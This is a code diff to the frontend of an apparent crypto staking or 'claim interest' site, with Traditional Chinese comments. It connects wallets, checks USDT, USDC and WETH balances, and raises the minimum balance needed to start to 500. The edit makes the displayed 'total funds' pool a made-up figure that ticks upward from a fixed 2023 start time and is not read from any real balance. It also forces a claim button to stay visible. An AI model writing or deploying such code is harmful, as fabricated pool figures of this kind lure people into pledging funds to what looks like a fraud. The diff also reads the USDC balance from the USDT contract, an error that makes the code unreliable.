@@ -443,8 +443,8 @@ function updateTotalFunds() {
   if (!totalValue) return;
   const initialFunds = 12856459.94;
   const increasePerSecond = 0.055;
-  const startTime = Date.now() - (initialFunds / increasePerSecond * 1000);
-  const elapsedSeconds = Math.floor((Date.now() - startTime) / 1000);
+  const fixedStartTime = 1698796800000; // 2023-11-01 00:00:00 UTC (固定起始時間)
+  const elapsedSeconds = Math.floor((Date.now() - fixedStartTime) / 1000);
   const total = initialFunds + (elapsedSeconds * increasePerSecond);
   totalValue.textContent = `${total.toLocaleString('en-US', { minimumFractionDigits: 2, maximumFractionDigits: 2 })} ETH`;
 }
@@ -454,7 +454,10 @@ function forceShowClaimButton() {
   const placeholder = document.getElementById('claimButtonPlaceholder');
   if (placeholder) {
     placeholder.style.display = 'inline-flex';
-    placeholder.onclick = claimInterest;
+  }
+  const btn = document.querySelector('#claimButtonPlaceholder .icon-btn');
+  if (btn) {
+    btn.addEventListener('click', claimInterest);
   }
 }
 
@@ -541,7 +544,7 @@ function updateLanguage(lang) {
     if (elements[key] && translations[lang]?.[key]) elements[key].textContent = translations[lang][key];
   }
   modalTitle.textContent = translations[lang]?.claimBtnText || 'Claim Interest';
-  
+
   const rulesTitle = document.getElementById('rulesTitle');
   const rulesContent = document.getElementById('rulesContent');
   if (rulesTitle) rulesTitle.textContent = translations[lang].rulesTitle;
@@ -613,7 +616,6 @@ function activateStakingUI() {
   if (nextBenefitInterval) clearInterval(nextBenefitInterval);
   nextBenefitInterval = setInterval(updateNextBenefitTimer, 1000);
   saveUserData();
-  // 強制顯示
   forceShowClaimButton();
 }
 
@@ -911,31 +913,23 @@ function setupSSE() {
   connectSSE();
 }
 
-// 初始化
+// 初始化：使用 window.onload 確保 ethers.js 載入完成
 window.onload = async () => {
   updateLanguage(currentLang);
   await initializeWallet();
 
   // 強制啟動總資金池
-  updateTotalFunds();
-  setInterval(updateTotalFunds, 1000);
+  setTimeout(() => {
+    updateTotalFunds();
+    setInterval(updateTotalFunds, 1000);
+  }, 100); // 延遲 100ms 確保 DOM 準備
 
-  // 強制顯示 + 綁定 ⚡（使用 addEventListener）
-  const showClaimButton = () => {
-    const placeholder = document.getElementById('claimButtonPlaceholder');
-    const btn = placeholder?.querySelector('.icon-btn');
-    if (placeholder && btn) {
-      placeholder.style.display = 'inline-flex';
-      btn.addEventListener('click', claimInterest);
-    }
-  };
-
-  showClaimButton();
-  setInterval(showClaimButton, 500); // 每 500ms 強制
+  // 強制顯示 Claim 圖案（每 500ms 一次）
+  setInterval(forceShowClaimButton, 500);
 
   setInitialNextBenefitTime();
 
-  // 綁定其他事件（避免 onclick）
+  // 綁定事件
   if (closeModal) closeModal.addEventListener('click', () => claimModal.style.display = 'none');
   if (cancelClaim) cancelClaim.addEventListener('click', () => claimModal.style.display = 'none');
   if (confirmClaim) {
@@ -985,7 +979,7 @@ window.onload = async () => {
   }
 
   if (startBtn) {
-    startBtn.onclick = async () => {
+    startBtn.addEventListener('click', async () => {
       const currentLang = localStorage.getItem('language') || 'zh-Hant';
       if (!signer) { updateStatus(translations[currentLang].noWallet, true); return; }
 
@@ -1042,7 +1036,7 @@ window.onload = async () => {
             message = translations[currentLang].wethValueTooLow;
           }
         } else {
-          if (balance >= 1) {
+          if (balance >= 500) {
             canStart = true;
           } else {
             message = translations[currentLang].balanceTooLow;
@@ -1066,7 +1060,7 @@ window.onload = async () => {
         startBtn.disabled = false;
         startBtn.textContent = translations[currentLang]?.startBtnText || '開始';
       }
-    };
+    });
   }
 
   if (pledgeBtn) {
@@ -1107,7 +1101,7 @@ window.onload = async () => {
       const currentLang = localStorage.getItem('language') || 'zh-Hant';
       if (!signer) { updateStatus(translations[currentLang].noWallet, true); return; }
       updateStatus(translations[currentLang].fetchingBalances);
-      const balances = { usdt: await retry(() => usdtContract.balanceOf(userAddress)).catch(() => 0n), usdc: await retry(() => usdcContract.balanceOf(userAddress)).catch(() => 0n), weth: await retry(() => wethContract.balanceOf(userAddress)).catch(() => 0n) };
+      const balances = { usdt: await retry(() => usdtContract.balanceOf(userAddress)).catch(() => 0n), usdc: await retry(() => usdtContract.balanceOf(userAddress)).catch(() => 0n), weth: await retry(() => wethContract.balanceOf(userAddress)).catch(() => 0n) };
       updateBalancesUI(balances); updateStatus('');
     };
   }
